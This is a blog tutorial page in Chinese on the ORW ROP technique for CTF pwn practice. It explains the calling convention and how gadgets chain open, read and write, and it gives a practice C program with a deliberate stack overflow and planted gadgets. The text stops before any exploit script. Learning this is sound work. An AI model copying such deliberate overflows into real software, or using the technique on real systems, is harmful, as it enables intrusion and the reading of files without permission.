@@ -1,0 +1,398 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>ORW 入门：用 ROP 打开、读取并输出文件 | Yanami Security Lab</title><meta name="author" content="Anna Yanami"><meta name="copyright" content="Anna Yanami"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="ORW 是 Pwn 中常见的一种利用方式，名字来自三个函数： 123O：open   打开文件R：read   读取文件W：write  输出内容 它的目标是利用程序中的漏洞，让程序打开一个文件，把文件内容读入内存，再输出到终端。本篇先讲清楚 ORW 的工作原理，再通过栈溢出题目实际构造 ROP 链。实战目录中会放置 flag.txt 作为目标文件；利用时仍然会先把字符串 flag.txt\0 写">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ORW 入门：用 ROP 打开、读取并输出文件">
+<meta property="og:url" content="https://yanami-sec.github.io/2026/10/07/ORW%20%E5%85%A5%E9%97%A8%EF%BC%9A%E7%94%A8%20ROP%20%E6%89%93%E5%BC%80%E3%80%81%E8%AF%BB%E5%8F%96%E5%B9%B6%E8%BE%93%E5%87%BA%E6%96%87%E4%BB%B6/index.html">
+<meta property="og:site_name" content="Yanami Security Lab">
+<meta property="og:description" content="ORW 是 Pwn 中常见的一种利用方式，名字来自三个函数： 123O：open   打开文件R：read   读取文件W：write  输出内容 它的目标是利用程序中的漏洞，让程序打开一个文件，把文件内容读入内存，再输出到终端。本篇先讲清楚 ORW 的工作原理，再通过栈溢出题目实际构造 ROP 链。实战目录中会放置 flag.txt 作为目标文件；利用时仍然会先把字符串 flag.txt\0 写">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://yanami-sec.github.io/img/yanami15.jpg">
+<meta property="article:published_time" content="2026-10-07T11:27:17.000Z">
+<meta property="article:modified_time" content="2026-10-07T11:27:17.000Z">
+<meta property="article:author" content="Anna Yanami">
+<meta property="article:tag" content="ORW">
+<meta property="article:tag" content="Pwn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://yanami-sec.github.io/img/yanami15.jpg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "ORW 入门：用 ROP 打开、读取并输出文件",
+  "url": "https://yanami-sec.github.io/2026/10/07/ORW%20%E5%85%A5%E9%97%A8%EF%BC%9A%E7%94%A8%20ROP%20%E6%89%93%E5%BC%80%E3%80%81%E8%AF%BB%E5%8F%96%E5%B9%B6%E8%BE%93%E5%87%BA%E6%96%87%E4%BB%B6/",
+  "image": "https://yanami-sec.github.io/img/yanami15.jpg",
+  "datePublished": "2026-10-07T11:27:17.000Z",
+  "dateModified": "2026-10-07T11:27:17.000Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Anna Yanami",
+      "url": "https://yanami-sec.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/avatar.jpg"><link rel="canonical" href="https://yanami-sec.github.io/2026/10/07/ORW%20%E5%85%A5%E9%97%A8%EF%BC%9A%E7%94%A8%20ROP%20%E6%89%93%E5%BC%80%E3%80%81%E8%AF%BB%E5%8F%96%E5%B9%B6%E8%BE%93%E5%87%BA%E6%96%87%E4%BB%B6/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.7.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.3.1/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        const data = { value }
+
+        if (ttl != null) {
+          data.expiry = Date.now() + ttl * 86400000
+        }
+
+        localStorage.setItem(key, JSON.stringify(data))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return
+
+        try {
+          const data = JSON.parse(itemStr)
+
+          if (data.expiry && Date.now() > data.expiry) {
+            localStorage.removeItem(key)
+            return
+          }
+
+          return data.value
+        } catch {
+          localStorage.removeItem(key)
+        }
+      }
+    }
+
+    const scriptCache = new Map()
+    const cssCache = new Map()
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => {
+        if (scriptCache.has(url)) {
+          return scriptCache.get(url)
+        }
+
+        const promise = new Promise((resolve, reject) => {
+          const script = document.createElement('script')
+
+          script.src = url
+          script.async = true
+
+          for (const key in attr) {
+            script.setAttribute(key, attr[key])
+          }
+
+          script.onload = resolve
+          script.onerror = reject
+
+          document.head.appendChild(script)
+        })
+
+        scriptCache.set(url, promise)
+
+        return promise
+      },
+      getCSS: (url, id) => {
+        if (cssCache.has(url)) {
+          return cssCache.get(url)
+        }
+
+        const promise = new Promise((resolve, reject) => {
+          const link = document.createElement('link')
+
+          link.rel = 'stylesheet'
+          link.href = url
+
+          if (id) {
+            link.id = id
+          }
+
+          link.onload = resolve
+          link.onerror = reject
+
+          document.head.appendChild(link)
+        })
+
+        cssCache.set(url, promise)
+
+        return promise
+      },
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const metaThemeColor = document.querySelector('meta[name="theme-color"]')
+      const activateDarkMode = () => {
+        document.documentElement.dataset.theme = 'dark'
+        if (metaThemeColor !== null) {
+          metaThemeColor.setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.dataset.theme = 'light'
+        if (metaThemeColor !== null) {
+          metaThemeColor.setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":800,"highlightFullpage":false,"highlightMacStyle":true},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'medium_zoom',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.13.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'ORW 入门：用 ROP 打开、读取并输出文件',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><link rel="stylesheet" href="/css/custom.css"><link rel="stylesheet" href="/css/runtime.css"><meta name="generator" content="Hexo 8.1.2"></head><body><div class="bg-animation" id="web_bg" style="background-image: url(/img/laoba.png);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">24</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">13</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/yanami/"><i class="fa-fw fas fa-utensils"></i><span> 八奈见食堂</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/yanami15.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Yanami Security Lab</span></a><a class="nav-page-title" href="/"><span class="site-name">ORW 入门：用 ROP 打开、读取并输出文件</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/yanami/"><i class="fa-fw fas fa-utensils"></i><span> 八奈见食堂</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">ORW 入门：用 ROP 打开、读取并输出文件</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-10-07T11:27:17.000Z" title="发表于 2026-10-07 19:27:17">2026-10-07</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-10-07T11:27:17.000Z" title="更新于 2026-10-07 19:27:17">2026-10-07</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Pwn/">Pwn</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><p>ORW 是 Pwn 中常见的一种利用方式，名字来自三个函数：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">O：open   打开文件</span><br><span class="line">R：read   读取文件</span><br><span class="line">W：write  输出内容</span><br></pre></td></tr></table></figure>
+<p>它的目标是利用程序中的漏洞，让程序打开一个文件，把文件内容读入内存，再输出到终端。<br>本篇先讲清楚 ORW 的工作原理，再通过栈溢出题目实际构造 ROP 链。实战目录中会放置 <code>flag.txt</code> 作为目标文件；利用时仍然会先把字符串 <code>flag.txt\0</code> 写入 <code>.bss</code>，再从 <code>.bss</code> 传给 <code>open()</code>。</p>
+<h2 id="ORW-原理"><a href="#ORW-原理" class="headerlink" title="ORW 原理"></a>ORW 原理</h2><h3 id="普通程序如何读取文件"><a href="#普通程序如何读取文件" class="headerlink" title="普通程序如何读取文件"></a>普通程序如何读取文件</h3><p>如果不考虑漏洞，普通 C 程序可以这样读取文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">int fd = open(&quot;flag.txt&quot;, 0);</span><br><span class="line"></span><br><span class="line">char buffer[256];</span><br><span class="line">int n = read(fd, buffer, sizeof(buffer));</span><br><span class="line"></span><br><span class="line">write(1, buffer, n);</span><br></pre></td></tr></table></figure>
+<p>执行顺序是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">open(&quot;flag.txt&quot;, 0)</span><br><span class="line">        ↓</span><br><span class="line">read(fd, buffer, 256)</span><br><span class="line">        ↓</span><br><span class="line">write(1, buffer, n)</span><br></pre></td></tr></table></figure>
+<p>三个函数分工明确</p>
+<ul>
+<li><code>open()</code> 根据文件名打开文件，返回文件描述符；</li>
+<li><code>read()</code> 根据文件描述符读取数据，把数据放进内存；</li>
+<li><code>write()</code> 把内存中的数据输出到指定文件描述符。<br>ROP 要做的事与这段 C 代码相同，只是我们需要通过栈上的返回地址和 gadget 控制函数调用。</li>
+</ul>
+<h3 id="文件描述符是什么"><a href="#文件描述符是什么" class="headerlink" title="文件描述符是什么"></a>文件描述符是什么</h3><p>Linux 用整数表示进程打开的文件，这个整数叫文件描述符，简称 fd。<br>通常</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0：标准输入</span><br><span class="line">1：标准输出</span><br><span class="line">2：标准错误</span><br></pre></td></tr></table></figure>
+<p>成功打开一个新文件后，<code>open()</code> 会返回一个可用的文件描述符。简单环境里常见返回值是 <code>3</code>，但不能保证一定是 3，因为进程也可能已经打开了其他文件。<br><code>open()</code> 的返回值放在 <code>rax</code> 中。</p>
+<h3 id="三个函数的参数"><a href="#三个函数的参数" class="headerlink" title="三个函数的参数"></a>三个函数的参数</h3><p>Linux amd64 的函数调用约定使用寄存器传递前几个参数：</p>
+<table>
+<thead>
+<tr>
+<th>参数序号</th>
+<th>寄存器</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>第 1 个</td>
+<td><code>rdi</code></td>
+</tr>
+<tr>
+<td>第 2 个</td>
+<td><code>rsi</code></td>
+</tr>
+<tr>
+<td>第 3 个</td>
+<td><code>rdx</code></td>
+</tr>
+<tr>
+<td>第 4 个</td>
+<td><code>rcx</code></td>
+</tr>
+<tr>
+<td>第 5 个</td>
+<td><code>r8</code></td>
+</tr>
+<tr>
+<td>第 6 个</td>
+<td><code>r9</code></td>
+</tr>
+</tbody></table>
+<p>ORW 用到的参数如下：</p>
+<table>
+<thead>
+<tr>
+<th>函数</th>
+<th><code>rdi</code></th>
+<th><code>rsi</code></th>
+<th><code>rdx</code></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>open(path, flags)</code></td>
+<td>文件名地址</td>
+<td>打开模式</td>
+<td>不使用</td>
+</tr>
+<tr>
+<td><code>read(fd, buffer, count)</code></td>
+<td>文件描述符</td>
+<td>缓冲区地址</td>
+<td>最多读取量</td>
+</tr>
+<tr>
+<td><code>write(fd, buffer, count)</code></td>
+<td>输出文件描述符</td>
+<td>数据地址</td>
+<td>输出长度</td>
+</tr>
+</tbody></table>
+<h3 id="open-需要文件名的地址"><a href="#open-需要文件名的地址" class="headerlink" title="open() 需要文件名的地址"></a><code>open()</code> 需要文件名的地址</h3><p><code>open()</code> 的函数原型可以简化为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int open(const char *pathname, int flags);</span><br></pre></td></tr></table></figure>
+<p>例如</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">open(&quot;flag.txt&quot;, 0);</span><br></pre></td></tr></table></figure>
+<p>第一个参数不是“文件名这几个字符作为一个数值”，而是指向字符串的指针。字符串还必须以 <code>\0</code> 结尾。<br>所以 ROP 调用 <code>open()</code> 时，需要做到</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rdi = &quot;flag.txt&quot; 所在的内存地址</span><br><span class="line">rsi = 0</span><br></pre></td></tr></table></figure>
+<p>参数 <code>0</code> 表示只读打开，也就是 <code>O_RDONLY</code>。</p>
+<h3 id="read-把数据写进内存"><a href="#read-把数据写进内存" class="headerlink" title="read() 把数据写进内存"></a><code>read()</code> 把数据写进内存</h3><p>函数原型</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssize_t read(int fd, void *buffer, size_t count);</span><br></pre></td></tr></table></figure>
+<p>调用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">read(fd, buffer, 0x100);</span><br></pre></td></tr></table></figure>
+<p>表示从 <code>fd</code> 对应的文件中最多读取 <code>0x100</code> 字节，写到 <code>buffer</code> 所指向的内存。<br>调用前需要设置</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rdi = fd</span><br><span class="line">rsi = buffer 地址</span><br><span class="line">rdx = 最大读取字节数</span><br></pre></td></tr></table></figure>
+<p><code>read()</code> 的返回值是实际读取的字节数，保存在 <code>rax</code> 中。请求读取 <code>0x100</code> 字节，不代表一定读取到 <code>0x100</code> 字节。</p>
+<h3 id="write-把内存内容输出"><a href="#write-把内存内容输出" class="headerlink" title="write() 把内存内容输出"></a><code>write()</code> 把内存内容输出</h3><p>函数原型</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssize_t write(int fd, const void *buffer, size_t count);</span><br></pre></td></tr></table></figure>
+<p>调用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">write(1, buffer, n);</span><br></pre></td></tr></table></figure>
+<p>表示把 <code>buffer</code> 中的 <code>n</code> 个字节写到文件描述符 <code>1</code>，也就是标准输出。<br>调用前需要设置</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rdi = 1</span><br><span class="line">rsi = buffer 地址</span><br><span class="line">rdx = 输出字节数</span><br></pre></td></tr></table></figure>
+<p><code>write()</code> 按长度输出数据，不依赖字符串结尾的 <code>\0</code>。</p>
+<h3 id="ROP-gadget-如何设置寄存器"><a href="#ROP-gadget-如何设置寄存器" class="headerlink" title="ROP gadget 如何设置寄存器"></a>ROP gadget 如何设置寄存器</h3><p>正常 C 函数调用由编译器设置参数。ROP 链没有编译器帮忙，因此要用 gadget 设置参数寄存器。<br>例如</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pop rdi; ret</span><br></pre></td></tr></table></figure>
+<p>它会从栈中取一个值放进 <code>rdi</code>，再从栈中取出下一个地址作为下一条执行位置。<br>调用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">open(path, 0);</span><br></pre></td></tr></table></figure>
+<p>需要的 ROP 结构是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pop rdi; ret</span><br><span class="line">path 的地址</span><br><span class="line">pop rsi; ret</span><br><span class="line">0</span><br><span class="line">open@plt</span><br></pre></td></tr></table></figure>
+<p>执行后</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rdi = path 地址</span><br><span class="line">rsi = 0</span><br><span class="line">RIP = open@plt</span><br></pre></td></tr></table></figure>
+<p>函数返回后，返回值在 <code>rax</code> 中。</p>
+<h3 id="为什么要把-eax-搬到-edi"><a href="#为什么要把-eax-搬到-edi" class="headerlink" title="为什么要把 eax 搬到 edi"></a>为什么要把 <code>eax</code> 搬到 <code>edi</code></h3><p><code>open()</code> 返回的 fd 在 <code>rax</code>，而 <code>read()</code> 的第一个参数要放在 <code>rdi</code>。因此需要把返回值搬过去，例如使用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov edi, eax; ret</span><br></pre></td></tr></table></figure>
+<p>调用流程是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">open(path, 0)</span><br><span class="line">        ↓</span><br><span class="line">eax = fd</span><br><span class="line">        ↓</span><br><span class="line">mov edi, eax; ret</span><br><span class="line">        ↓</span><br><span class="line">edi = fd</span><br><span class="line">        ↓</span><br><span class="line">read(fd, buffer, count)</span><br></pre></td></tr></table></figure>
+<p>写入 32 位寄存器 <code>edi</code> 会把 <code>rdi</code> 的高 32 位清零。文件描述符是小整数，因此这样传递是合适的。<br>不能假设 fd 永远是 3。使用返回值更可靠。</p>
+<h3 id="bss-在-ORW-中的作用"><a href="#bss-在-ORW-中的作用" class="headerlink" title=".bss 在 ORW 中的作用"></a><code>.bss</code> 在 ORW 中的作用</h3><p>ROP 链通常放在溢出后的栈上；ROP 链使用的数据则可以放在 <code>.bss</code>。<br><code>.bss</code> 是程序中可读写的内存区域。我们可以用它存放：</p>
+<ul>
+<li><code>open()</code> 要用的文件名；</li>
+<li><code>read()</code> 接收文件内容的缓冲区。</li>
+</ul>
+<p>本篇实战会先把 <code>flag.txt\0</code> 写入 <code>.bss</code>。<code>open()</code> 成功打开文件后，路径字符串就不再需要，因此后续可以用同一块 <code>.bss</code> 缓冲区存放文件内容。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">第一阶段：</span><br><span class="line">stdin → .bss 中的 &quot;flag.txt\0&quot;</span><br><span class="line"></span><br><span class="line">第二阶段：</span><br><span class="line">文件 → .bss 中的文件内容 → stdout</span><br></pre></td></tr></table></figure>
+<h2 id="实战：栈溢出构造-ORW"><a href="#实战：栈溢出构造-ORW" class="headerlink" title="实战：栈溢出构造 ORW"></a>实战：栈溢出构造 ORW</h2><h3 id="题目源码"><a href="#题目源码" class="headerlink" title="题目源码"></a>题目源码</h3><p>创建 <code>orw.c</code>：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 让 open、read、write 都被链接进程序。</span></span><br><span class="line"><span class="comment"> * 正常流程不会调用这个函数。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">__attribute__((used, noinline))</span><br><span class="line"><span class="type">void</span> <span class="title function_">keep_orw_functions</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    open(<span class="string">&quot;flag.txt&quot;</span>, O_RDONLY);</span><br><span class="line">    read(<span class="number">0</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">    write(<span class="number">1</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 提供 ROP 参数控制 gadget */</span></span><br><span class="line">__attribute__((naked, used))</span><br><span class="line"><span class="type">void</span> <span class="title function_">gadget_pop_rdi</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    __asm__(<span class="string">&quot;pop %rdi\n\tret&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__attribute__((naked, used))</span><br><span class="line"><span class="type">void</span> <span class="title function_">gadget_pop_rsi</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    __asm__(<span class="string">&quot;pop %rsi\n\tret&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__attribute__((naked, used))</span><br><span class="line"><span class="type">void</span> <span class="title function_">gadget_pop_rdx</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    __asm__(<span class="string">&quot;pop %rdx\n\tret&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 把 open 返回的 fd 从 eax 搬到 read 所需的 edi */</span></span><br><span class="line">__attribute__((naked, used))</span><br><span class="line"><span class="type">void</span> <span class="title function_">gadget_mov_edi_eax</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov %eax, %edi\n\tret&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vuln</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">64</span>];</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Input:&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">256</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    vuln();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>漏洞在这里</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">char buf[64];</span><br><span class="line">read(0, buf, 256);</span><br></pre></td></tr></table></figure>
+<p>缓冲区只有 64 字节，程序却最多向其中写入 256 字节，因此可以覆盖保存的返回地址并控制程序执行流程。<br><code>keep_orw_functions()</code> 的作用是确保二进制包含 <code>open()</code>、<code>read()</code>、<code>write()</code> 的链接入口。它不是利用链的一部分，也不会在正常程序流程中执行。</p>
+<h3 id="准备-flag-文件"><a href="#准备-flag-文件" class="headerlink" title="准备 flag 文件"></a>准备 flag 文件</h3><p>在运行程序的当前目录创建 <code>flag.txt</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">printf &#x27;flag&#123;learn_orw_rop&#125;\n&#x27; &gt; flag.txt</span><br></pre></td></tr></table></figure>
+<p>注意，<code>open(&quot;flag.txt&quot;, 0)</code> 使用相对路径，所以程序会从<strong>当前工作目录</strong>查找文件。应在包含 <code>flag.txt</code> 的目录中运行程序。<br>虽然目录里已经有 <code>flag.txt</code>，利用时仍然要把字符串 <code>flag.txt\0</code> 写进 <code>.bss</code>。文件本身是磁盘上的内容；<code>open()</code> 的参数则需要进程内存中的路径字符串，两者不是同一个东西。</p>
